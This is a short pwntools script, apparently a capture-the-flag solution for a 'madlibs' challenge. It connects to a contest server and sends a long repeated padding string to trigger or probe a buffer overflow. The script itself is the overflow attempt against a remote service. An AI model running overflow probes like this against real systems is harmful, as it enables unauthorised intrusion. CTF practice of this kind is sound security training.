from pwn import *

r = remote("madlibs.litctf.live", 1337)

r.sendline(b"ABC")
r.sendline(b"AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTT" * 10)

print(r.recvall().strip())